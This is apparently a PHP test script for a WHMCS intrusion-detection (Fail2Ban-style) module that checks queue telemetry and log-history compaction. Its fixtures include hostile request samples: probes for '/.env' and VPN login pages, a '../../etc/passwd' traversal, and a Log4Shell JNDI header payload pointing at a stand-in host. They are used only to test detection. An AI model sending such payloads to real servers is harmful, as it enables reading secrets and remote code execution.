<?php
namespace WHMCS\Database {
class Capsule {public static array $rows=[];public static function table($t){return new Query;}}
class Query {public function __call($name,$args){return $this;}public function get(){return array_map(fn($r)=>(object)$r,Capsule::$rows);}}
}
namespace AMS\Fail2Ban {
if(PHP_SAPI!=='cli')exit(1);
class Database {public static array $cfg=['schema_version'=>'37'];public static function getConfig($k,$d=''){return self::$cfg[$k]??$d;}public static function setConfig($k,$v){self::$cfg[$k]=$v;}}
class DecisionMemory {public static function policyFingerprint(){return 'fixture-policy';}}
require dirname(__DIR__).'/lib/Router.php';date_default_timezone_set('America/Sao_Paulo');
$n=0;function qc($ok,$why){global $n;if(!$ok)throw new \RuntimeException($why);$n++;}
foreach([
 [null,['revision'=>1],true],
 [null,['revision'=>1,'analyzed_revision'=>1,'processing_state'=>'observed_normal'],false],
 [null,['revision'=>1,'analyzed_revision'=>1,'processing_state'=>'observed_static'],false],
 [null,['revision'=>1,'analyzed_revision'=>1,'processing_state'=>'observed_local'],false],
 [['revision'=>2,'analyzed_revision'=>2],['revision'=>3],true],
 [['revision'=>2,'analyzed_revision'=>2],['revision'=>3,'analyzed_revision'=>3],false],
 [['revision'=>2,'analyzed_revision'=>1],['revision'=>3],false],
 [['revision'=>2,'analyzed_revision'=>1],['revision'=>3,'analyzed_revision'=>3],false],
 [['revision'=>2,'analyzed_revision'=>2],['revision'=>2],false],
] as [$before,$next,$expected])qc(QueueTelemetry::entersQueue($before,$next)===$expected,'Queue transition');
$at=time()-7200;$ip='198.51.100.77';$source='/var/log/apache2/access_whmcs.log';
function contextRow($path='/robots.txt',$state='observed_normal',$tail='"-" "fixture"'){
 global $at,$ip,$source;$line=$ip.' - - ['.date('d/M/Y:H:i:s O',$at).'] "GET '.$path.' HTTP/1.1" 200 12 '.$tail;$pattern=BehaviorStore::pattern($line);
 return ['ip'=>$ip,'source_log'=>$source,'pattern'=>$pattern,'bucket'=>date('Y-m-d H:i:s',$at),'events'=>1,'revision'=>1,'analyzed_revision'=>1,'processing_state'=>$state,'samples'=>json_encode([['id'=>hash('sha256',$line),'time'=>$at,'line'=>$line,'pattern'=>$pattern,'ip'=>$ip]])];
}
$row=contextRow();$summary=LocalObservation::historySummary($row);
qc($summary!==null&&!isset($summary['sample'])&&$summary['local_observation']==='normal'&&$summary['events']===1,'Old completed observation compacted without raw line');
$static=contextRow('/assets/css/site.css','observed_static');
qc(LocalObservation::historySummary($static,fn($s,$p)=>$s===$source&&$p==='/assets/css/site.css')['local_observation']==='static','Attested static summarized');
qc(LocalObservation::historySummary($static,fn()=>false)===null,'Missing asset retains context');
foreach(['pending','review','processed','observed_local'] as $state){$r=$row;$r['processing_state']=$state;qc(LocalObservation::historySummary($r)===null,'Other state preserved');}
foreach(['revision'=>2,'analyzed_revision'=>0,'failure_code'=>'filter_refused','decision_state'=>'rejected','samples'=>'null'] as $k=>$v){$r=$row;$r[$k]=$v;qc(LocalObservation::historySummary($r)===null,'Unresolved/corrupt context preserved');}
foreach(['/.env','/+CSCOE+/logon.html','/api/sonicos/tfa','/vpn/pluginlist.xml','/index.php?x=../../etc/passwd'] as $path)qc(LocalObservation::historySummary(contextRow($path))===null,'Offensive context retained');
qc(LocalObservation::historySummary(contextRow(tail:'"-" "${jndi:ldap://evil/x}"'))===null,'Header payload retained');
$r=$row;$es=json_decode($r['samples'],true);$es[0]['time']='wrong';$r['samples']=json_encode($es);qc(LocalObservation::historySummary($r)===null,'Corrupt timestamp retained');
\WHMCS\Database\Capsule::$rows=[$row,contextRow('/.env','pending')];$h=BehaviorStore::history($ip);
qc(count($h)===2&&!isset($h[0]['sample'])&&str_contains($h[1]['sample'],'/.env'),'Real history integration preserves offensive sample');
Database::$cfg[LocalObservation::HISTORY_KEY]='0';qc(isset(BehaviorStore::history($ip)[0]['sample']),'UI toggle restores raw context');unset(Database::$cfg[LocalObservation::HISTORY_KEY]);
Database::$cfg['schema_version']='36';qc(LocalObservation::historySummary($row)===null,'Previous schema unchanged');
$metric=['started_at'=>time()-10,'finished_at'=>time(),'error'=>'','reason'=>'queue_not_ready','completed'=>2,'local_observed'=>1,'eligible_ready_start'=>4,'eligible_ready_end'=>1,'eligible_comparable'=>true,'eligibility_policy_hash'=>'fixture-policy'];
Database::$cfg['ai_queue_entries_total']='100';Database::$cfg['ai_queue_expired_total']='7';QueueTelemetry::finish($metric);
qc(QueueTelemetry::summary()['metric_version']===1,'Legacy metric version');
Database::$cfg['schema_version']='37';Database::$cfg['ai_queue_entries_total']='110';QueueTelemetry::finish($metric);
$h=QueueTelemetry::history();$first=end($h);qc(count($h)===2&&$first['metric_version']===3&&$first['entries_since_previous']===null,'Version boundary preserves history without mixed interval');
qc(Database::$cfg['ai_queue_entries_total']==='110','Counter not reset');
Database::$cfg['ai_queue_entries_total']='112';QueueTelemetry::finish($metric);Database::$cfg['ai_queue_entries_total']='114';QueueTelemetry::finish($metric);
$s=QueueTelemetry::summary(['ready'=>2,'awaiting_recheck'=>0]);
qc($s['cycles']===3&&$s['entries']===4&&$s['completed']===4&&$s['local_completed']===2&&$s['net_completed']===2,'Same-version intervals include local worker exits');
qc($s['capacity']==='draining','Eligible capacity remains independently measured');
qc(count(QueueTelemetry::history())===4,'Old cycle preserved');
echo "PASS: {$n} queue arrival/version and local-context integration checks; memory-only\n";
}
